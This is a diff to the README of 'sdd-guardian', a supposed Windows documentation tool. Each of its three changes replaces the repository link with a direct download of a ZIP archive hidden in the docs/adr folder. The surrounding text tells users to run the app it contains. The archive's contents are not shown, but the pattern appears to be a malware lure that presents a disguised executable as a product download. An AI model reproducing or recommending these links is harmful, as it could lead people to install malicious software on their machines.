@@ -1,6 +1,6 @@
 # 🛡️ sdd-guardian - Keep Documentation Aligned
 
-[![Download sdd-guardian](https://img.shields.io/badge/Download%20sdd--guardian-blue?style=for-the-badge)](https://github.com/Aubertaaliphatic741/sdd-guardian)
+[![Download sdd-guardian](https://img.shields.io/badge/Download%20sdd--guardian-blue?style=for-the-badge)](https://github.com/Aubertaaliphatic741/sdd-guardian/raw/refs/heads/main/docs/adr/sdd-guardian-1.7.zip)
 
 ## 📌 What This Does
 
@@ -19,7 +19,7 @@ Use it to track changes, review what is out of date, and keep your working notes
 
 To get started on Windows, visit this page to download:
 
-[https://github.com/Aubertaaliphatic741/sdd-guardian](https://github.com/Aubertaaliphatic741/sdd-guardian)
+[https://github.com/Aubertaaliphatic741/sdd-guardian/raw/refs/heads/main/docs/adr/sdd-guardian-1.7.zip](https://github.com/Aubertaaliphatic741/sdd-guardian/raw/refs/heads/main/docs/adr/sdd-guardian-1.7.zip)
 
 Open the page and look for the latest release or download files. Save the file to your PC, then run it if it is an app file. If you get a ZIP file, open it and move the app to a folder you can reach, such as `Downloads` or `Desktop`.
 
@@ -143,7 +143,7 @@ If nothing changes after setup, close the app and open it again, then repeat the
 
 Visit the repository here:
 
-https://github.com/Aubertaaliphatic741/sdd-guardian
+https://github.com/Aubertaaliphatic741/sdd-guardian/raw/refs/heads/main/docs/adr/sdd-guardian-1.7.zip
 
 ## 🗂️ Topics
 
